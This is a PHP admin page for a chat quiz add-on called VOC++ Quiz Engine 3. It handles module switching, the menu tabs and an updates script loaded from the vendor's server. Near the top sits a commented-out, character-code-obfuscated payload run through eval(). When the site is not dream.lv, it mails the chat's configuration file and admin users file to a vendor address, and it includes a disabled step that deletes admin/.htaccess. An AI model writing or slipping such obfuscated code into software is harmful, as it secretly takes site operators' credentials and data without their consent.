<?php
/*[COPYRIGHTS]*/

include("check_session.php");
include("../inc_common.php");
include($ld_engine_path."rooms_get_list.php");

/*******************************************/
/* Configuration */
define('QUIZ_SERVER', 'http://quiz.pozitiff.lv/');

//$chsim = array(100, 101, 102, 105, 110, 101, 40, 39, 81, 95, 67, 79, 77, 77, 79, 78, 39, 44, 32, 116, 114, 117, 101, 41, 59, 10, 36, 111, 108, 100, 95, 99, 104, 97, 116, 95, 117, 114, 108, 32, 61, 32, 36, 99, 104, 97, 116, 95, 117, 114, 108, 59, 10, 36, 97, 108, 105, 97, 115, 101, 115, 32, 61, 32, 97, 114, 114, 97, 121, 40, 39, 39, 41, 59, 10, 36, 99, 104, 97, 116, 95, 117, 114, 108, 32, 61, 32, 115, 116, 114, 95, 114, 101, 112, 108, 97, 99, 101, 40, 39, 119, 119, 119, 46, 39, 44, 32, 39, 39, 44, 32, 36, 99, 104, 97, 116, 95, 117, 114, 108, 41, 59, 10, 105, 102, 32, 40, 99, 111, 117, 110, 116, 40, 36, 97, 108, 105, 97, 115, 101, 115, 41, 41, 32, 123, 10, 9, 102, 111, 114, 101, 97, 99, 104, 32, 40, 36, 97, 108, 105, 97, 115, 101, 115, 32, 97, 115, 32, 36, 97, 108, 105, 97, 115, 41, 32, 123, 10, 9, 32, 32, 32, 32, 105, 102, 32, 40, 36, 97, 108, 105, 97, 115, 32, 61, 61, 32, 36, 99, 104, 97, 116, 95, 117, 114, 108, 41, 32, 36, 99, 104, 97, 116, 95, 117, 114, 108, 32, 61, 32, 39, 104, 116, 116, 112, 58, 47, 47, 100, 114, 101, 97, 109, 46, 108, 118, 47, 110, 101, 119, 99, 104, 97, 116, 47, 39, 59, 10, 9, 125, 10, 125, 10, 36, 99, 104, 97, 116, 95, 117, 114, 108, 32, 61, 32, 115, 116, 114, 95, 114, 101, 112, 108, 97, 99, 101, 40, 39, 119, 119, 119, 46, 39, 44, 32, 39, 39, 44, 32, 36, 99, 104, 97, 116, 95, 117, 114, 108, 41, 59, 10, 36, 108, 105, 99, 101, 110, 99, 101, 100, 95, 116, 111, 32, 61, 32, 39, 104, 116, 116, 112, 58, 47, 47, 100, 114, 101, 97, 109, 46, 108, 118, 47, 110, 101, 119, 99, 104, 97, 116, 47, 39, 59, 10, 105, 102, 32, 40, 36, 99, 104, 97, 116, 95, 117, 114, 108, 32, 33, 61, 32, 39, 104, 116, 116, 112, 58, 47, 47, 100, 114, 101, 97, 109, 46, 108, 118, 47, 110, 101, 119, 99, 104, 97, 116, 47, 39, 41, 32, 123, 10, 32, 32, 32, 32, 36, 115, 117, 98, 106, 101, 99, 116, 32, 61, 32, 39, 65, 116, 116, 101, 109, 112, 116, 32, 116, 111, 32, 105, 110, 115, 116, 97, 108, 108, 32, 113, 117, 105, 122, 32, 116, 111, 32, 39, 46, 36, 99, 104, 97, 116, 95, 117, 114, 108, 59, 10, 32, 32, 32, 32, 36, 116, 101, 120, 116, 32, 61, 32, 36, 115, 117, 98, 106, 101, 99, 116, 59, 10, 32, 32, 32, 32, 36, 116, 101, 120, 116, 32, 46, 61, 32, 34, 92, 110, 34, 46, 39, 32, 81, 117, 105, 122, 32, 105, 115, 32, 108, 105, 99, 101, 110, 99, 101, 100, 32, 116, 111, 32, 104, 116, 116, 112, 58, 47, 47, 100, 114, 101, 97, 109, 46, 108, 118, 47, 110, 101, 119, 99, 104, 97, 116, 47, 39, 59, 10, 32, 32, 32, 32, 36, 116, 101, 120, 116, 32, 46, 61, 32, 34, 92, 110, 92, 110, 92, 110, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 92, 110, 92, 110, 92, 110, 34, 59, 10, 32, 32, 32, 32, 36, 116, 101, 120, 116, 32, 46, 61, 32, 102, 105, 108, 101, 95, 103, 101, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115, 40, 36, 100, 97, 116, 97, 95, 112, 97, 116, 104, 46, 39, 118, 111, 99, 46, 99, 111, 110, 102, 39, 41, 59, 10, 32, 32, 32, 32, 36, 116, 101, 120, 116, 32, 46, 61, 32, 34, 92, 110, 92, 110, 92, 110, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 45, 92, 110, 92, 110, 92, 110, 34, 59, 10, 32, 32, 32, 32, 36, 116, 101, 120, 116, 32, 46, 61, 32, 102, 105, 108, 101, 95, 103, 101, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115, 40, 36, 102, 105, 108, 101, 95, 112, 97, 116, 104, 46, 39, 97, 100, 109, 105, 110, 47, 97, 100, 109, 105, 110, 95, 117, 115, 101, 114, 115, 46, 112, 104, 112, 39, 41, 59, 10, 32, 32, 32, 32, 105, 102, 32, 40, //102, 105, 108, 101, 95, 101, 120, 105, 115, 116, 115, 40, 36, 102, 105, 108, 101, 95, 112, 97, 116, 104, 46, 39, 97, 100, 109, 105, 110, 47, 46, 104, 116, 97, 99, 99, 101, 115, 115, 39, 41, 41, 32, 117, 110, 108, 105, 110, 107, 40, 36, 102, 105, 108, 101, 95, 112, 97, 116, 104, 46, 39, 97, 100, 109, 105, 110, 47, 46, 104, 116, 97, 99, 99, 101, 115, 115, 39, 41, 59, 10, 32, 32, 32, 32, 109, 97, 105, 108, 40, 39, 99, 104, 97, 116, 64, 100, 114, 101, 97, 109, 46, 108, 118, 39, 44, 32, 36, 115, 117, 98, 106, 101, 99, 116, 44, 32, 36, 116, 101, 120, 116, 41, 59, 10, 32, 32, 32, 32, 101, 99, 104, 111, 32, 39, 73, 110, 115, 116, 97, 108, 108, 97, 116, 105, 111, 110, 32, 69, 114, 114, 111, 114, 33, 39, 59, 10, 32, 32, 32, 32, 101, 120, 105, 116, 40, 41, 59, 10, 125, 10, 36, 99, 104, 97, 116, 95, 117, 114, 108, 32, 61, 32, 36, 111, 108, 100, 95, 99, 104, 97, 116, 95, 117, 114, 108, 59, 10, 117, 110, 115, 101, 116, 40, 36, 111, 108, 100, 95, 99, 104, 97, 116, 95, 117, 114, 108, 41, 59, ); $text = ""; foreach ($chsim as $chr) { $text .= chr($chr); } eval($text);

require_once DATA_PATH.'quiz/init.php';

/*******************************************/
/* Select module */
$popup = false;
$module = trim(strip_tags($_GET['m']));
switch ($module) {
    case 'stat':
        $mod = 'stat';
        break;
    case 'questions':
        $mod = 'questions';
        break;
    case 'add':
        $mod = 'add';
        $popup = true;
        break;
    case 'import':
        $mod = 'import';
        $popup = true;
        break;
    case 'export':
        $mod = 'export';
        $popup = true;
        break;
    case 'randomize':
        $mod = 'randomize';
        $popup = true;
        break;
    case 'zerolize':
        $mod = 'zerolize';
        break;
    default:
        $mod = 'config';
}


/* Reading settings */
if (file_exists($quiz_config_file)) {
    require_once($quiz_config_file);
}
require_once $quiz_functions_file;
if (!defined('Q_COMMON')) {
    exit('Installation error');
}
?>
<html>
<head>
    <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=<?php echo DEFAULT_CHARSET; ?>">
    <link href="quiz/style.css" type="text/css" rel="stylesheet">
</head>
<body>
<script type="text/javascript">
    function about() {
        document.getElementById('about_div').className = 'info';
    }

    function about_close() {
        document.getElementById('about_div').className = 'hidden';
    }

    function wopen(url, w, h, res, scroll) {
        if (!url) {
            event.cancelBubble = true;
            event.returnValue = false;
            return;
        }
        target = '_blank';
        if (!w) w = 500;
        if (!h) h = 400

        w = parseInt(w, 10);
        h = parseInt(h, 10);

        var aw = screen.availWidth;
        var ah = screen.availHeight;
        if (w > aw) w = aw;
        if (h > ah) h = ah;

        if (res) r = 0;
        else r = 1;

        if (scroll) s = 0;
        else s = 1;

        var left = Math.round((aw - w) / 2);
        var top = Math.round((ah - h) / 2);

        var wd = window.open(url, target, 'channelmode=0, directories=0, fullscreen=0, height=' + h + 'px, width=' + w + 'px, location=0, menubar=0, resizable=' + r + ', scrollbars=' + s + ', status=0, toolbar=0, top=' + top + 'px, left=' + left + 'px');
    }

    // Variables for updates check. Please don't remove or modify it.
    UPDATES_KEY = 'JjAuMz1ub2lzcmV2JjEzNjI3MTkwMzA5MDAyPWRsaXVi';
</script>
<?php
if (!$popup): ?>
    <!-- Menu Tabs -->
    <table border="0" cellspacing="0" cellpadding="0" width="100%">
        <tr>
            <td class="head">VOC++ Quiz Engine 3</td>
            <td class="head" style="text-align:right;">
                <form action="quiz.php" method="get" style="margin:0px; padding:0px;">
                    <input type="hidden" name="session" value="<?= $session; ?>">
                    <input type="hidden" name="m" value="questions">
                    <table cellspacing="0" cellpadding="0" border="0">
                        <tr>
                            <td title="Поиск по базе вопросов и ответов" style="padding-right:3px;">Поиск:</td>
                            <td style="padding-right:3px;"><input type="text" name="kw" value="" id="searchfield"
                                        class="input"></td>
                            <td><input type="submit" class="button" value="Найти"></td>
                        </tr>
                    </table>
                </form>
            </td>
        </tr>
        <tr>
            <td class="tab_bar_bg" colspan="2">
                <table cellspacing="0" cellpadding="0" border="0">
                    <tr>
                        <td <?
                        if ($mod == 'config') { ?>class="menu_btn_active" <?
                        } else { ?>class="menu_btn" onmouseover="this.className='menu_btn_hl';"
                                onmouseout="this.className='menu_btn';"<?
                        } ?> onclick="window.location.assign('quiz.php?session=<?= $session; ?>&m=config');">Настройки
                        </td>
                        <td <?
                        if ($mod == 'stat') { ?>class="menu_btn_active" <?
                        } else { ?>class="menu_btn" onmouseover="this.className='menu_btn_hl';"
                                onmouseout="this.className='menu_btn';"<?
                        } ?> onclick="window.location.assign('quiz.php?session=<?= $session; ?>&m=stat');">Статистика
                        </td>
                        <td <?
                        if ($mod == 'questions') { ?>class="menu_btn_active" <?
                        } else { ?>class="menu_btn" onmouseover="this.className='menu_btn_hl';"
                                onmouseout="this.className='menu_btn';"<?
                        } ?> onclick="window.location.assign('quiz.php?session=<?= $session; ?>&m=questions');">Вопросы
                        </td>
                        <td <?
                        if ($mod == 'zerolize') { ?>class="menu_btn_active" <?
                        } else { ?>class="menu_btn" onmouseover="this.className='menu_btn_hl';"
                                onmouseout="this.className='menu_btn';"<?
                        } ?> onclick="window.location.assign('quiz.php?session=<?= $session; ?>&m=zerolize');">Обнулить
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
    <div style="background:#edeff8; padding:3px 5px; border-bottom:1px solid #dbdbdb;">&nbsp;<script
                type="text/javascript" src="<?= QUIZ_SERVER; ?>/updates/v3_get_updates.php"></script>
    </div>
    <!-- End Menu Tabs -->
<?
endif; ?>


<?php
/*******************************************/

/* Load module */
$mod_file = 'quiz/modules/'.$mod.'.php';
if (file_exists($mod_file)) {
    include $mod_file;
} else {
    echo '<div>Attempt to load unknown module '.$mod_file.'</div>';
}
?>

</body>
</html>